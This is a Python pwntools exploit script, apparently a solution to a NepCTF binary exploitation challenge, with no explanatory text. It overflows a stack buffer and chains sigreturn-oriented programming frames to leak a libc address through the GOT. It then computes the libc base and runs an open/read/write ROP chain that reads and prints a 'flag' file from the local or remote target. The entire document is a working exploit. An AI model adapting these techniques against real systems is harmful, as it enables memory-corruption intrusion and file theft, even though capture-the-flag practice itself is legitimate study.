from pwn import * 
from pwn import p64,u64


debug = 1
gdb_is = 1
# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./pwn")
    
else:
    host = "nepctf.1cepeak.cn"
    r = connect(host,32552)#远程连接
    gdb_is =0

if gdb_is:
    # gdb.attach(r,'b* 0x00401571')
    gdb.attach(r)
    pause()
    pass



elf = ELF('./pwn')
libc = ELF('./libc-2.27.so')
pop_rdi = 0x000400813
pop_rsi_r15 = 0x000400811
# sigreturn_addr = 0x00400754

bss_addr = 0x601050
base_addr = bss_addr + 0x8
syscall_addr = elf.sym['syscall']
payload= b'A'* 48 + b'junkjunk' 
syscall_got = elf.got['syscall']

frame_write = SigreturnFrame()
frame_write.rdi = 1
frame_write.rsi = 1
frame_write.rdx = syscall_got
frame_write.rcx = 0x8
frame_write.rip = syscall_addr
frame_write.rsp = base_addr + 0xF0 + 0x8 * 4



frame_read_data = SigreturnFrame()
frame_read_data.rdi = 0
frame_read_data.rsi = 0
frame_read_data.rdx = bss_addr
frame_read_data.rcx = 0x228
frame_read_data.rsp = base_addr 
frame_read_data.rip = syscall_addr



payload +=  p64(pop_rdi)+ p64(0xf) +p64(syscall_addr) + bytes(frame_read_data) 
r.send(payload)
time.sleep(1)





#----------------------------------------

frame_read_data = SigreturnFrame()
frame_read_data.rdi = 0
frame_read_data.rsi = 0
frame_read_data.rdx = bss_addr
frame_read_data.rcx = 0x8 * 30
frame_read_data.rsp = base_addr  - 0x8
frame_read_data.rip = syscall_addr

payload_read = p64(pop_rdi)+ p64(0xf) +p64(syscall_addr) + bytes(frame_read_data) 

payload = p64(0) + p64(pop_rdi)+ p64(0xf) +p64(syscall_addr) + bytes(frame_write) + payload_read
r.send(payload)

#----------------------------------------
libc_syscall_addr = u64(r.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
libc.address =  libc_syscall_addr - libc.sym['syscall']
info(f'libc_syscall_addr = {hex(libc_syscall_addr)}')
info(f'system = {hex(libc.sym["system"])}')

pop_rsi = 0x00023a6a + libc.address
pop_rdx = 0x000001b96 + libc.address
syscall_addr = 0x0011B537 + libc.address
pop_rax = 0x001b500  + libc.address


# payload = p64(pop_rdi) + b'flag'.ljust(8,b'\x00') + p64(pop_rsi) + p64(0) +p64(pop_rdx)+ p64(0)+ p64(pop_rax) + p64(2) + p64(syscall_addr)
# payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(0x00601009)  +p64(pop_rdx)+ p64(0x30) + p64(pop_rax) + p64(0) + p64(syscall_addr)
# payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(0x00601009)  +p64(pop_rdx)+ p64(0x30) + p64(pop_rax) + p64(1) + p64(syscall_addr)
time.sleep(1)


payload = p64(pop_rdi) + p64(bss_addr + 0x8 * 25) + p64(pop_rsi) + p64(0)+ p64(pop_rax) + p64(2) + p64(syscall_addr)

payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(0x00601009) + p64(pop_rdx) + p64(0x40)  + p64(pop_rax) + p64(0) + p64(syscall_addr)

payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(0x00601009) + p64(pop_rdx) + p64(0x40) + p64(pop_rax) + p64(1) + p64(syscall_addr)

payload += b'flag'.ljust(8, b'\x00') 

r.send(payload)

r.interactive()
